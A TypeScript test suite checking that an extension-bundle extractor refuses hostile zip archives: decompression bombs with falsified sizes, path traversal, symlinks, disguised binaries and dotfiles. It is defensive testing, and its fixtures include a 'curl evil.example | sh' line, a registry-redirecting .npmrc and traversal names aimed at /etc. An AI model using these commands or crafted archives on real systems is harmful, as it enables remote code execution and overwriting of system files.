import { describe, expect, it } from "vitest";
import { existsSync, mkdtempSync, readFileSync, rmSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { crc32, deflateRawSync } from "node:zlib";
import {
  BundleIntakeError,
  DEFAULT_INTAKE_LIMITS,
  type IntakeRefusal,
  archiveStats,
  extractBundleTree,
  findExtensionRoots,
} from "../../src/core/sysops/bundleIntake.js";

/**
 * Refusal tests for locally-uploaded extension bundles.
 *
 * This is the one place in the system where a byte string chosen by whoever is
 * uploading is written to the core's filesystem and then executed, so the
 * interesting assertions are all about REFUSING. A test that only proves a good
 * zip installs would pass just as happily against a version of this module with
 * every guard deleted.
 *
 * The zips are built byte by byte rather than with adm-zip, for two reasons that
 * are the whole point of several of these cases: adm-zip normalises `..` out of
 * an entry name as you add it, so it cannot express a traversal archive at all;
 * and it computes the size fields honestly, so it cannot express an archive that
 * LIES about them — which is the attack the size caps exist for.
 */

const STORED = 0;
const DEFLATED = 8;
const S_IFREG = 0o100000;
const S_IFLNK = 0o120000;

interface RawEntry {
  name: string;
  /** Decompressed content. Deflated by the builder when `method` says so. */
  content?: Buffer | string;
  method?: number;
  flags?: number;
  /** Unix mode, written into the high half of the external attributes. */
  mode?: number;
  /** Override the size fields, to build an archive that misdescribes itself. */
  declaredSize?: number;
  declaredCompressedSize?: number;
  /** Bytes to store verbatim, bypassing the builder's own compression. */
  rawStored?: Buffer;
}

function rawZip(entries: RawEntry[]): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;

  for (const entry of entries) {
    const nameBuf = Buffer.from(entry.name, "utf8");
    const plain =
      typeof entry.content === "string" ? Buffer.from(entry.content, "utf8") : entry.content ?? Buffer.alloc(0);
    const method = entry.method ?? STORED;
    const stored = entry.rawStored ?? (method === DEFLATED ? deflateRawSync(plain) : plain);

    const crc = crc32(plain);
    const size = entry.declaredSize ?? plain.length;
    const compressedSize = entry.declaredCompressedSize ?? stored.length;
    const flags = entry.flags ?? 0;

    const localHeader = Buffer.alloc(30);
    localHeader.writeUInt32LE(0x04034b50, 0);
    localHeader.writeUInt16LE(20, 4);
    localHeader.writeUInt16LE(flags, 6);
    localHeader.writeUInt16LE(method, 8);
    localHeader.writeUInt32LE(crc, 14);
    localHeader.writeUInt32LE(compressedSize, 18);
    localHeader.writeUInt32LE(size, 22);
    localHeader.writeUInt16LE(nameBuf.length, 26);
    const local = Buffer.concat([localHeader, nameBuf, stored]);
    locals.push(local);

    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    // Version made by: 3 (unix) in the high byte, so the mode is honoured.
    central.writeUInt16LE(0x0314, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(flags, 8);
    central.writeUInt16LE(method, 10);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(compressedSize, 20);
    central.writeUInt32LE(size, 24);
    central.writeUInt16LE(nameBuf.length, 28);
    if (entry.mode !== undefined) central.writeUInt32LE((entry.mode << 16) >>> 0, 38);
    central.writeUInt32LE(offset, 42);
    centrals.push(Buffer.concat([central, nameBuf]));
    offset += local.length;
  }

  const directory = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(directory.length, 12);
  eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, directory, eocd]);
}

const MANIFEST = JSON.stringify({ name: "demo", runtime: "node", entrypoint: "index.mjs" });

/** A legitimate bundle, plus whatever hostile entries a case adds. */
function bundle(extra: RawEntry[] = [], manifest = MANIFEST): Buffer {
  return rawZip([
    { name: "manifest.json", content: manifest, mode: S_IFREG | 0o644 },
    { name: "index.mjs", content: "export default () => ({});\n", mode: S_IFREG | 0o644 },
    ...extra,
  ]);
}

const dest = (): string => mkdtempSync(join(tmpdir(), "bundle-intake-test-"));

/** Assert the refusal class, not just that something threw. */
function refuses(zip: Buffer, code: IntakeRefusal, options: Parameters<typeof extractBundleTree>[2] = {}) {
  let thrown: unknown;
  try {
    extractBundleTree(zip, dest(), options);
  } catch (err) {
    thrown = err;
  }
  expect(thrown, "extraction was accepted").toBeInstanceOf(BundleIntakeError);
  expect((thrown as BundleIntakeError).code).toBe(code);
  return thrown as BundleIntakeError;
}

describe("extractBundleTree accepts a legitimate bundle", () => {
  it("writes the tree and reports the bytes it actually produced", () => {
    const dir = dest();
    const result = extractBundleTree(bundle(), dir);

    expect(result.manifestName).toBe("demo");
    expect(result.files).toBe(2);
    expect(readFileSync(join(dir, "index.mjs"), "utf8")).toContain("export default");
    // Not the declared size: the count comes from decompression.
    expect(result.uncompressedBytes).toBe(MANIFEST.length + "export default () => ({});\n".length);
  });

  it("writes files 0600 and directories 0700, ignoring the modes in the archive", () => {
    // A bundle cannot make its own files group- or world-readable, let alone
    // executable, by saying so in the zip.
    const dir = dest();
    extractBundleTree(
      bundle([{ name: "data/langs.json", content: "{}", mode: S_IFREG | 0o666 }]),
      dir,
    );
    expect(statSync(join(dir, "data/langs.json")).mode & 0o777).toBe(0o600);
    expect(statSync(join(dir, "data")).mode & 0o777).toBe(0o700);
  });

  it("accepts a zip with no unix modes at all, which is what Windows produces", () => {
    const dir = dest();
    expect(() =>
      extractBundleTree(
        rawZip([
          { name: "manifest.json", content: MANIFEST },
          { name: "index.mjs", content: "export default () => ({});\n" },
        ]),
        dir,
      ),
    ).not.toThrow();
  });
});

describe("extractBundleTree refuses decompression bombs", () => {
  const tiny = { maxEntryBytes: 4096, maxTotalBytes: 16384, maxRatio: 50 };

  it("refuses an entry that DECLARES an impossible compression ratio", () => {
    // The cheap pre-check: refused on the header alone, nothing decompressed.
    // Declared size stays UNDER the per-entry cap so that the size check cannot
    // fire first — otherwise this passes without the ratio guard existing.
    const err = refuses(
      bundle([
        {
          name: "big.json",
          content: "{}",
          method: DEFLATED,
          declaredSize: 4000,
          declaredCompressedSize: 10,
        },
      ]),
      "compression_ratio",
      { limits: tiny },
    );
    expect(err.message).toMatch(/compression ratio/);
  });

  it("refuses an entry that LIES about its size and expands past the cap anyway", () => {
    // The load-bearing case. Declared size is 12 bytes, so every header-based
    // check passes; the entry actually inflates to 1 MiB. A guard that trusted
    // the central directory would have written the whole megabyte to disk.
    //
    // Note the compressed size is left HONEST. Understating that instead just
    // truncates the deflate stream, which is refused as a corrupt archive — a
    // real refusal, but a different one, and it would not exercise the ceiling.
    const payload = Buffer.alloc(1024 * 1024, 0x41);
    const err = refuses(
      bundle([{ name: "liar.json", content: payload, method: DEFLATED, declaredSize: 12 }]),
      "entry_too_large",
      { limits: tiny },
    );
    expect(err.message).toContain("liar.json");
  });

  it("refuses a liar that slips past every per-entry check, on the overall ratio", () => {
    // Per-entry ratios cannot catch this: if each entry is under the limit then
    // so is their weighted average, so the only way the overall check earns its
    // place is against an archive whose declared sizes understate reality. Here
    // one entry declares 10 bytes, inflates to 20 KiB, and stays under both byte
    // caps — every per-entry gate passes and the total ratio is what refuses it.
    const err = refuses(
      bundle([
        { name: "quiet.json", content: Buffer.alloc(20_000, 0x44), method: DEFLATED, declaredSize: 10 },
      ]),
      "compression_ratio",
      { limits: { maxEntryBytes: 32_768, maxTotalBytes: 65_536, maxRatio: 50 } },
    );
    expect(err.message).toMatch(/overall/);
  });

  it("refuses a stored entry that is simply enormous", () => {
    // No compression to see through: it cannot lie, it is just too big.
    refuses(
      bundle([{ name: "huge.txt", content: Buffer.alloc(8192, 0x42) }]),
      "entry_too_large",
      { limits: tiny },
    );
  });

  it("refuses an archive whose entries are individually fine but collectively a bomb", () => {
    // Each file sits under the per-entry cap; together they blow the budget.
    // This is the shape that defeats a per-file-only check. Stored rather than
    // deflated, so each entry's ratio is exactly 1:1 and the total-bytes budget
    // is unambiguously the guard being tested.
    const chunk = Buffer.alloc(3000, 0x43);
    const many = Array.from({ length: 12 }, (_, i) => ({ name: `part${i}.txt`, content: chunk }));
    refuses(bundle(many), "archive_too_large", { limits: tiny });
  });

  it("refuses an archive with more entries than the cap, before reading any of them", () => {
    const many = Array.from({ length: 40 }, (_, i) => ({ name: `f${i}.txt`, content: "x" }));
    refuses(bundle(many), "too_many_entries", { limits: { maxArchiveEntries: 10 } });
  });

  it("refuses more files in the selected directory than the cap", () => {
    const many = Array.from({ length: 20 }, (_, i) => ({ name: `f${i}.txt`, content: "x" }));
    refuses(bundle(many), "too_many_entries", { limits: { maxEntries: 5 } });
  });

  it("has default caps well below what would trouble the core", () => {
    // The container runs with a 768 MiB limit and a 256 MiB tmpfs, so the
    // ceiling on a single extraction has to stay a small fraction of that.
    expect(DEFAULT_INTAKE_LIMITS.maxTotalBytes).toBeLessThan(64 * 1024 * 1024);
    expect(DEFAULT_INTAKE_LIMITS.maxEntryBytes).toBeLessThanOrEqual(
      DEFAULT_INTAKE_LIMITS.maxTotalBytes,
    );
  });
});

describe("extractBundleTree refuses paths that escape the extraction root", () => {
  const cases: [string, string, IntakeRefusal][] = [
    ["a parent traversal", "../escaped.json", "traversal"],
    ["a nested traversal", "data/../../escaped.json", "traversal"],
    ["a traversal that cancels out", "data/../langs.json", "traversal"],
    ["a backslash traversal", "..\\escaped.json", "traversal"],
    ["a percent-encoded traversal", "%2e%2e/escaped.json", "traversal"],
    ["a malformed escape", "%zz/escaped.json", "traversal"],
    ["an absolute unix path", "/etc/cron.d/pwn.json", "absolute_path"],
    ["a windows drive path", "C:/windows/system32/x.json", "absolute_path"],
  ];

  for (const [label, name, code] of cases) {
    it(`refuses ${label} (${JSON.stringify(name)})`, () => {
      refuses(bundle([{ name, content: "{}", mode: S_IFREG | 0o644 }]), code);
    });
  }

  it("refuses a symlink entry, which looks exactly like a small text file", () => {
    // Honouring one is how an extraction writes through a link to somewhere it
    // was never allowed; the content here is the target path.
    const err = refuses(
      bundle([{ name: "langs.json", content: "/etc/passwd", mode: S_IFLNK | 0o777 }]),
      "link_entry",
    );
    expect(err.message).toContain("symlink");
  });

  it("refuses a special file", () => {
    refuses(bundle([{ name: "fifo.json", content: "", mode: 0o010000 | 0o644 }]), "link_entry");
  });
});

describe("extractBundleTree refuses executables however they are named", () => {
  const magic: [string, string, Buffer, IntakeRefusal][] = [
    ["an ELF binary", "helper.js", Buffer.from("7f454c46020101", "hex"), "binary_content"],
    ["a Windows PE", "helper.js", Buffer.from("4d5a90000300", "hex"), "binary_content"],
    ["a Mach-O binary", "helper.mjs", Buffer.from("cffaedfe0c000001", "hex"), "binary_content"],
    ["a Java class", "data.json", Buffer.from("cafebabe0000003d", "hex"), "binary_content"],
    ["a WebAssembly module", "mod.js", Buffer.from("0061736d01000000", "hex"), "binary_content"],
    ["a nested zip", "data.json", Buffer.from("504b03040a00", "hex"), "nested_archive"],
    ["a gzip stream", "data.json", Buffer.from("1f8b0800", "hex"), "nested_archive"],
    ["a zstd stream", "data.txt", Buffer.from("28b52ffd00", "hex"), "nested_archive"],
  ];

  for (const [label, name, content, code] of magic) {
    it(`refuses ${label} named ${name}`, () => {
      // The extension allowlist only constrains what an attacker CALLS a file,
      // so the decision has to be made on the decompressed bytes.
      const err = refuses(bundle([{ name, content, mode: S_IFREG | 0o644 }]), code);
      expect(err.message).toContain("whatever it is named");
    });
  }

  it("refuses a tar, whose magic sits 257 bytes in", () => {
    const tar = Buffer.alloc(512, 0);
    tar.write("ustar", 257, "utf8");
    refuses(bundle([{ name: "data.json", content: tar, mode: S_IFREG | 0o644 }]), "nested_archive");
  });

  it("refuses a python file with the porting message, not with the allowlist message", () => {
    // Its own refusal code rather than `disallowed_type`: a pre-v2 python
    // extension is a real thing an operator still has on disk, and "port it to
    // extension API v2" is a more useful answer than a list of seven allowed
    // extensions. The same message BundleStore gives for a python manifest.
    const err = refuses(
      bundle([{ name: "setup.py", content: "print(1)\n", mode: S_IFREG | 0o644 }]),
      "python_bundle",
    );
    expect(err.message).toMatch(/extension API v2/);
  });

  it("refuses a shebang, because a bundle is imported and not run", () => {
    refuses(
      bundle([{ name: "run.js", content: "#!/bin/sh\ncurl evil.example | sh\n", mode: S_IFREG | 0o644 }]),
      "shebang",
    );
  });

  it("refuses a file marked executable", () => {
    const err = refuses(
      bundle([{ name: "tool.js", content: "//\n", mode: S_IFREG | 0o755 }]),
      "executable_mode",
    );
    expect(err.message).toMatch(/chmod -x/);
  });

  const disallowed = ["install.sh", "native.node", "lib.dylib", "lib.so", "run.exe", "x.yaml"];
  for (const name of disallowed) {
    it(`refuses ${name} on its extension alone`, () => {
      refuses(bundle([{ name, content: "harmless text", mode: S_IFREG | 0o644 }]), "disallowed_type");
    });
  }

  const nested = ["vendor.zip", "vendor.tar", "vendor.tgz", "vendor.whl", "vendor.jar"];
  for (const name of nested) {
    it(`refuses ${name} as a container`, () => {
      refuses(bundle([{ name, content: "not really an archive", mode: S_IFREG | 0o644 }]), "nested_archive");
    });
  }
});

describe("extractBundleTree refuses toolchain and dependency state", () => {
  it("refuses a vendored node_modules tree", () => {
    const err = refuses(
      bundle([{ name: "node_modules/left-pad/index.js", content: "//\n", mode: S_IFREG | 0o644 }]),
      "dependency_tree",
    );
    expect(err.message).toMatch(/without installing anything/);
  });

  for (const name of ["package-lock.json", "pnpm-lock.yaml", "yarn.lock", "bun.lockb"]) {
    it(`refuses ${name}`, () => {
      refuses(bundle([{ name, content: "{}", mode: S_IFREG | 0o644 }]), "dependency_tree");
    });
  }

  it("refuses .npmrc, which can point the registry somewhere else", () => {
    refuses(bundle([{ name: ".npmrc", content: "registry=https://evil.example\n", mode: S_IFREG | 0o644 }]), "dotfile");
  });

  it("refuses a dotfile in a subdirectory too", () => {
    refuses(bundle([{ name: "data/.env", content: "TOKEN=x\n", mode: S_IFREG | 0o644 }]), "dotfile");
  });
});

describe("extractBundleTree refuses archives it cannot account for", () => {
  it("refuses an encrypted entry rather than extracting a placeholder", () => {
    refuses(
      bundle([{ name: "secret.json", content: "{}", flags: 0x1, mode: S_IFREG | 0o644 }]),
      "encrypted_entry",
    );
  });

  it("refuses a compression method it cannot measure", () => {
    // Method 99 is AES; 9 is deflate64. Neither is inflate-able here, and
    // guessing is how an unmeasured stream gets written to disk.
    const err = refuses(
      bundle([{ name: "odd.json", content: "{}", method: 99, mode: S_IFREG | 0o644 }]),
      "unsupported_compression",
    );
    expect(err.message).toContain("99");
  });

  it("refuses bytes that are not a zip at all", () => {
    refuses(Buffer.from("this is not a zip file, it is prose"), "unreadable_zip");
  });

  it("refuses a deflated entry whose stream is corrupt", () => {
    refuses(
      bundle([
        {
          name: "corrupt.json",
          content: "{}",
          method: DEFLATED,
          rawStored: Buffer.from("ffffffffffff", "hex"),
          mode: S_IFREG | 0o644,
        },
      ]),
      "unreadable_zip",
    );
  });
});

describe("extractBundleTree manifest handling", () => {
  it("says what to zip when there is no manifest", () => {
    const err = refuses(
      rawZip([{ name: "index.mjs", content: "export default () => ({});\n" }]),
      "no_manifest",
    );
    expect(err.message).toMatch(/Zip the extension directory/);
  });

  it("refuses to guess between several extensions", () => {
    const err = refuses(
      rawZip([
        { name: "src/one/manifest.json", content: MANIFEST },
        { name: "src/two/manifest.json", content: MANIFEST },
      ]),
      "ambiguous_manifest",
    );
    expect(err.message).toMatch(/one at a time/);
  });

  it("refuses a manifest that is not JSON", () => {
    refuses(bundle([], "{ this is not json"), "manifest_unreadable");
  });

  it("widens the allowlist for the data files the manifest declares", () => {
    // A .proto is allowed anyway; .bin is not, unless declared.
    const dir = dest();
    const manifest = JSON.stringify({ name: "demo", data_files: { table: "tables.bin" } });
    const result = extractBundleTree(
      rawZip([
        { name: "manifest.json", content: manifest },
        { name: "index.mjs", content: "export default () => ({});\n" },
        { name: "tables.bin", content: "opaque but declared" },
      ]),
      dir,
    );
    expect(result.files).toBe(3);
    expect(readFileSync(join(dir, "tables.bin"), "utf8")).toBe("opaque but declared");
  });

  it("does not let a data_files entry become permission to write outside the root", () => {
    // The declared path gets the same name checks as everything else.
    const manifest = JSON.stringify({ name: "demo", data_files: { evil: "../../etc/passwd" } });
    refuses(
      rawZip([
        { name: "manifest.json", content: manifest },
        { name: "../../etc/passwd", content: "root:x:0:0::/root:/bin/sh\n" },
      ]),
      "traversal",
    );
  });
});

describe("findExtensionRoots", () => {
  it("prefers the conventional src/<name> layout", () => {
    const roots = findExtensionRoots(
      rawZip([
        { name: "wrap/extras/vendor/manifest.json", content: MANIFEST },
        { name: "wrap/src/mangaplus/manifest.json", content: MANIFEST },
      ]),
      { stripArchiveRoot: true },
    );
    expect(roots[0]).toBe("src/mangaplus");
  });

  it("skips a hostile name instead of throwing, leaving the refusal to extraction", () => {
    // Root discovery is a survey; refusing is extraction's job, and a throw here
    // would mean one bad entry hid every legitimate extension in the archive.
    const roots = findExtensionRoots(
      rawZip([
        { name: "../evil/manifest.json", content: MANIFEST },
        { name: "src/good/manifest.json", content: MANIFEST },
      ]),
    );
    expect(roots).toEqual(["src/good"]);
  });
});

describe("archiveStats", () => {
  it("fingerprints an archive so a refusal is still auditable", () => {
    // A refused upload is exactly the one worth being able to identify later.
    const zip = bundle();
    const stats = archiveStats(zip);
    expect(stats.sha256).toMatch(/^[0-9a-f]{64}$/);
    expect(stats.bytes).toBe(zip.length);
    expect(stats.entries).toBe(2);
  });

  it("reports zero entries for unreadable bytes instead of throwing", () => {
    // Called on the audit path, where throwing would lose the record of the
    // refusal we are trying to write down.
    expect(archiveStats(Buffer.from("garbage")).entries).toBe(0);
  });
});

/**
 * Cases that arrived with the GitHub-archive half of the intake: the same module
 * validates a repository zipball, which is fetched over the network and written
 * by anyone who can push to that repo.
 */
describe("extractBundleTree on a repository archive", () => {
  /** A GitHub zipball: everything under one `owner-repo-sha/` wrapper. */
  const zipball = (files: Record<string, string>): Buffer =>
    rawZip(
      Object.entries(files).map(([name, content]) => ({
        name: `publoader-ext-abc1234/${name}`,
        content,
        mode: S_IFREG | 0o644,
      })),
    );

  it("takes one directory and flattens it, leaving the rest of the repo behind", () => {
    const dir = dest();
    const result = extractBundleTree(
      zipball({
        "README.md": "# repo\n",
        "src/demo/manifest.json": MANIFEST,
        "src/demo/index.ts": "export default () => ({});\n",
        "src/demo/lib/helper.ts": "export const x = 1;\n",
        "src/other/manifest.json": MANIFEST,
        "src/other/index.mjs": "export default () => ({});\n",
      }),
      dir,
      { stripArchiveRoot: true, subPath: "src/demo" },
    );

    expect(result).toMatchObject({ root: "src/demo", files: 3, manifestName: "demo" });
    // The extension's own directory becomes the destination root.
    expect(existsSync(join(dir, "manifest.json"))).toBe(true);
    expect(existsSync(join(dir, "lib/helper.ts"))).toBe(true);
    expect(statSync(join(dir, "lib")).mode & 0o777).toBe(0o700);
    // Nothing from the rest of the repository comes with it.
    expect(existsSync(join(dir, "src"))).toBe(false);
    expect(existsSync(join(dir, "README.md"))).toBe(false);
  });

  it("reports a directory that is not in the archive as its own refusal", () => {
    // Not an attack and not treated as one: this is what a push that DELETED an
    // extension looks like, and the publish path turns it into "skipped".
    refuses(zipball({ "src/other/manifest.json": MANIFEST }), "subtree_missing", {
      stripArchiveRoot: true,
      subPath: "src/gone",
    });
  });

  it("applies every content check inside a repository subtree too", () => {
    refuses(
      zipball({
        "src/demo/manifest.json": MANIFEST,
        "src/demo/index.mjs": "export default () => ({});\n",
        "src/demo/vendor.so": "\x7fELF harmless-looking text",
      }),
      "disallowed_type",
      { stripArchiveRoot: true, subPath: "src/demo" },
    );
  });
});

describe("extractBundleTree writes nothing outside its destination", () => {
  /**
   * The assertion the traversal cases above imply but do not check: that no file
   * appeared anywhere else. Cheap, and it is the actual consequence being
   * defended against rather than a proxy for it.
   */
  const witness = join(tmpdir(), "publoader-intake-must-not-exist.json");

  const escapes = [
    "../publoader-intake-must-not-exist.json",
    "../../../../../../../../tmp/publoader-intake-must-not-exist.json",
    "..%2f..%2f..%2fpubloader-intake-must-not-exist.json",
    "..\\..\\publoader-intake-must-not-exist.json",
    `${tmpdir()}/publoader-intake-must-not-exist.json`,
  ];

  for (const name of escapes) {
    it(`leaves the filesystem alone for ${JSON.stringify(name)}`, () => {
      rmSync(witness, { force: true });
      expect(() =>
        extractBundleTree(bundle([{ name, content: "{}", mode: S_IFREG | 0o644 }]), dest()),
      ).toThrow(BundleIntakeError);
      expect(existsSync(witness)).toBe(false);
    });
  }

  it("refuses a name containing a null byte", () => {
    // A NUL truncates a path at the syscall boundary in some languages; node
    // throws instead, but a name carrying one is malformed either way.
    refuses(
      bundle([{ name: "langs.json\u0000.so", content: "{}", mode: S_IFREG | 0o644 }]),
      "traversal",
    );
  });

  it("refuses a percent-encoded absolute path", () => {
    refuses(bundle([{ name: "%2Fetc%2Fcron.d%2Fpwn.json", content: "{}" }]), "absolute_path");
  });
});
